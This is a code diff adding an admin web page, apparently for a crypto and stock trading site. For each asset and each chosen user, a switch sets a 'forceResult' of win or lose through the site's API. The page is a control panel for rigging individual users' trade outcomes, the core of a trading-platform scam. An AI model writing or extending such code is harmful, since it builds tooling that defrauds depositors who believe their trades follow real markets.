@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html class="dark">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Assets Control</title>
+
+<script src="https://cdn.tailwindcss.com"></script>
+
+</head>
+
+<body class="bg-[#0a0a0a] text-white">
+
+<!-- 🔥 HEADER -->
+<div class="fixed top-0 left-0 w-full bg-[#131313]/90 backdrop-blur z-50 px-4 py-4 flex items-center gap-3 border-b border-white/10">
+  <button onclick="goBack()" class="text-xl">←</button>
+  <h1 class="text-lg font-bold">Assets Control</h1>
+</div>
+
+<!-- 🔥 CONTENT -->
+<div class="pt-20 pb-6 px-4">
+  <div id="assetList" class="flex flex-col gap-3"></div>
+</div>
+
+<script>
+const API_URL = window.location.origin;
+const token = localStorage.getItem("token");
+
+if (!token) {
+  alert("Access denied");
+  window.location.href = "login.html";
+}
+
+async function checkAdmin() {
+  try {
+    const res = await fetch("/api/user/profile", {
+      headers: {
+        Authorization: "Bearer " + token
+      }
+    });
+
+    const user = await res.json();
+
+    if (user.role !== "admin") {
+      alert("Admin only");
+      window.location.href = "profile.html";
+    }
+
+  } catch (err) {
+    alert("Access error");
+    window.location.href = "login.html";
+  }
+}
+
+checkAdmin();
+
+// 🔥 รับ userId จาก URL
+const urlParams = new URLSearchParams(window.location.search);
+let userId = urlParams.get("userId");
+
+if(!userId){
+  userId = localStorage.getItem("userId"); // ✅ fallback
+}
+
+if(!userId){
+  alert("ไม่พบ userId");
+}
+
+// 🧠 asset config
+const assetConfig = {
+  "BINANCE:BTCUSDT": { name: "Bitcoin", icon: "images/assets/btc.png" },
+  "BINANCE:ETHUSDT": { name: "Ethereum", icon: "images/assets/eth.png" },
+  "BINANCE:BNBUSDT": { name: "BNB", icon: "images/assets/bnb.png" },
+  "BINANCE:SOLUSDT": { name: "Solana", icon: "images/assets/sol.png" },
+  "BINANCE:XRPUSDT": { name: "XRP", icon: "images/assets/xrp.png" },
+  "BINANCE:ADAUSDT": { name: "Cardano", icon: "images/assets/ada.png" },
+  "BINANCE:DOGEUSDT": { name: "Dogecoin", icon: "images/assets/doge.png" },
+  "BINANCE:AVAXUSDT": { name: "Avalanche", icon: "images/assets/avax.png" },
+  "BINANCE:DOTUSDT": { name: "Polkadot", icon: "images/assets/dot.png" },
+  "BINANCE:LINKUSDT": { name: "Chainlink", icon: "images/assets/link.png" },
+
+  "NASDAQ:AAPL": { name: "Apple", icon: "images/assets/aapl.png" },
+  "NASDAQ:MSFT": { name: "Microsoft", icon: "images/assets/msft.png" },
+  "NASDAQ:TSLA": { name: "Tesla", icon: "images/assets/tsla.png" },
+  "NASDAQ:NVDA": { name: "Nvidia", icon: "images/assets/nvda.png" },
+  "NASDAQ:AMZN": { name: "Amazon", icon: "images/assets/amzn.png" },
+
+  // =====================
+// 🚀 US STOCKS
+// =====================
+"NASDAQ:AMD": { name: "AMD", icon: "images/assets/amd.png" },
+"NASDAQ:META": { name: "Meta", icon: "images/assets/meta.png" },
+"NASDAQ:NFLX": { name: "Netflix", icon: "images/assets/nflx.png" },
+"NASDAQ:GOOGL": { name: "Google", icon: "images/assets/google.png" },
+
+// =====================
+// 🏦 STOCKS
+// =====================
+"NYSE:JPM": { name: "JPMorgan", icon: "images/assets/jpm.png" },
+"NYSE:KO": { name: "Coca-Cola", icon: "images/assets/ko.png" },
+"NYSE:DIS": { name: "Disney", icon: "images/assets/dis.png" },
+
+// =====================
+// 📊 ETF
+// =====================
+"NYSE:SPY": { name: "S&P 500 ETF", icon: "images/assets/spy.png" },
+"NASDAQ:QQQ": { name: "Nasdaq ETF", icon: "images/assets/qqq.png" },
+"NYSE:THD": { name: "Thailand ETF", icon: "images/assets/thd.png" },
+
+// =====================
+// 🥈 COMMODITY
+// =====================
+"C:XAGUSD": { name: "Silver", icon: "images/assets/silver.png" },
+
+  "OANDA:XAUUSD": { name: "Gold", icon: "images/assets/gold.png" }
+};
+
+const container = document.getElementById("assetList");
+
+async function loadAssets(){
+
+  for(const symbol of Object.keys(assetConfig)){
+
+    const asset = assetConfig[symbol];
+
+    const div = document.createElement("div");
+
+    div.className = "bg-[#1d1f20] p-4 rounded-xl flex items-center justify-between";
+
+    div.innerHTML = `
+      <div class="flex items-center gap-3">
+
+        <img src="${asset.icon}" class="w-10 h-10 rounded-full bg-white/10 p-1"/>
+
+        <div>
+          <div class="font-bold text-sm">${asset.name}</div>
+          <div class="text-xs text-gray-400">${symbol}</div>
+        </div>
+
+      </div>
+
+      <label class="relative inline-flex items-center cursor-pointer">
+        <input type="checkbox" 
+          id="switch-${symbol}"
+          class="sr-only peer"
+          onchange="toggleWin('${symbol}')">
+
+        <div class="w-11 h-6 bg-gray-600 rounded-full peer 
+          peer-checked:bg-green-500
+          after:content-[''] after:absolute after:top-[2px] after:left-[2px] 
+          after:bg-white after:rounded-full after:h-5 after:w-5 
+          after:transition-all 
+          peer-checked:after:translate-x-full">
+        </div>
+      </label>
+    `;
+
+    container.appendChild(div);
+
+    // ✅ โหลดค่าจาก DB
+    try{
+      const res = await fetch(`${API_URL}/api/admin/get-trade-setting?symbol=${symbol}&userId=${userId}`,{
+        headers:{
+          "Authorization":"Bearer " + token
+        }
+      });
+
+      const data = await res.json();
+
+      const sw = document.getElementById("switch-"+symbol);
+
+      if(data.forceResult === "win"){
+        sw.checked = true;
+      }
+
+    }catch(err){
+      console.log("โหลด setting ไม่ได้", symbol);
+    }
+
+  }
+
+}
+
+// 🔥 กำหนด WIN / LOSE
+async function setResult(symbol, result){
+
+  try{
+
+    await fetch(`${API_URL}/api/admin/trade-setting`,{
+      method:"POST",
+      headers:{
+        "Content-Type":"application/json",
+        "Authorization":"Bearer " + token
+      },
+      body: JSON.stringify({
+        userId,       // 🔥 สำคัญ
+        symbol,
+        forceResult: result
+      })
+    });
+
+    alert(`ตั้งค่า ${symbol} → ${result.toUpperCase()} สำเร็จ`);
+
+  }catch(err){
+    alert("เกิดข้อผิดพลาด");
+  }
+
+}
+
+
+async function toggleWin(symbol){
+
+  const checkbox = document.getElementById("switch-"+symbol);
+
+  const result = checkbox.checked ? "win" : "lose";
+
+  try{
+
+   await fetch(`${API_URL}/api/admin/trade-setting`,{
+      method:"POST",
+      headers:{
+        "Content-Type":"application/json",
+        "Authorization":"Bearer " + token
+      },
+      body: JSON.stringify({
+        userId,
+        symbol,
+        forceResult: result
+      })
+    });
+
+  }catch(err){
+    alert("error");
+  }
+
+}
+
+
+
+// 🔙 BACK
+function goBack(){
+  window.history.back();
+}
+loadAssets();
+</script>
+
+</body>
+</html>
